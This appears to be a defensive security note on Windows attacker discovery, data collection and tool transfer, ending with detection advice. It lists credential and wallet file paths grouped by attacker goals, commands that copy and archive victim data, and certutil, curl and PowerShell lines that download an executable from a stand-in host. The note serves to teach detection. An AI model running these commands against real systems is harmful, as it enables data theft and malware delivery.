# Collection
Collection happens after access is gained by adversary. Below are paths that are often targeted. Remember that every attacker has a different goal, it can be crypto wallets, images, gaming, banking accounts etc.

```shell
# [Goal: Blackmail Victim] Photos, Chats, Browser History
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

# [Goal: Steal Money] Web Banking Sessions, Crypto Wallets
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# [Goal: Steal Corporate Data] SSH Credentials, Databases
C:\Users\<user>\.ssh\*
C:\Program Files\Microsoft SQL Server\...\DATA\*
```

# Discovery (CMD & PowerShell)
When attackers gain access to a system, they use commands to know what privileges they have, users on the device, network status and so on. Here are some key commands to look out for.

```cmd

net user --List all local users

whoami /priv --Show user permissions

ipconfig --Show network settings

tasklist /v --Show running processes

wmic computersystem get model --Query for laptop model
```

```powershell
Get-Service --List active services

Get-MpPreference --Check MS Defender settings
```

# Discovery (GUI)
Although the terminal is used as a habit, it is not limited to it only. Below are key directories attackers aim for.

```sql
├── C:\Windows\system32\mmc.exe C:\Windows\system32\compmgmt.msc  // Open Computer Management
├── C:\Windows\system32\control.exe netconnections                // List network adapters
├── C:\Windows\ImmersiveControlPanel\SystemSettings.exe [...]     // Access settings panel
├── C:\Windows\system32\notepad.exe C:\...\secrets.txt            // Read a text file
└── C:\Windows\system32\taskmgr.exe                               // Run Task Manager
```

Below are commands from **CMD & PowerShell** that can be used for data collection.

``` cmd
1- notepad.exe C:\Users\<user>\Desktop\finances-2025.csv
Exp: Using notepad to get the content of the file of interest.

2- type debug-logs.txt | findstr password > C:\Temp\passwords.txt
Exp: Searching for the keyword password in a specified file.

3- Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf
Exp: Searching for PDF files in the user's home folder.

4- copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\
Exp: Copying Signal chat history to the Temp directorty.

5- Compress-Archive C:\Temp\ C:\Temp\Stolen-data.zip
Exp: Archiving stolen data for exfiltration.
```

As we know data can be collected and exfiltrated manually or automatically (via scripts). In the case below, we can see attackers manually collecting data using **CMD**, and we can easily detect it via **Sysmon Event ID 1**.

![](images/exfil.png)


# Ingress Tool Transfer
As we just saw, hackers can go through directories and files manually but lets be realistic, whos doing that when you can just use an infostealer like **Mimikatz** or **Seatbelt** for instance.

# Common Transfer Techniques
When malware is embedded in a phishing message or email, its not going to have everything the attacker needs. This is done to avoid detection by antivirus and EDRs in the beginning. 

These are some commands that can be used to download the rest of the needed malware or tools by the attacker **after gaining access** to the system.

``` cmd
certutil.exe -urlcache -f https://haha.com/goated.exe cute.exe
curl.exe htpps://haha.com/goated.exe -o cute.exe
powershell -c "Invoke-WebRequest -Uri 'https://haha.com/goated.exe' -OutFile 'cute.exe'"
```
Or it can just be downloaded from a web browser or drop the malware by RDP.

# Summary

**How to detect such behavior?**
Today i just discussed briefly regarding data collection and discovery. However when it comes to detecting suspicious activity, we can do so using about Event Viewer. I have previously covered the following:
Monitoring using [**Sysmon**](https://github.com/12oLL/Labz/blob/main/LogAnalysis/Sysmon%20via%20PowerShell%20%26%20Event%20Viewer.md) and detecting **[data exfiltration](https://medium.com/@omaraani/data-exfiltration-ddd8ea2c3bfd)**.

## Key Takeways
- Discovery happens once attacker gains access to the system.
- The goal of discovery is to identify the victim, whereas collection focuses on collecting sensitive data.
- Attacker can exfil the stolen information or download more malwre.
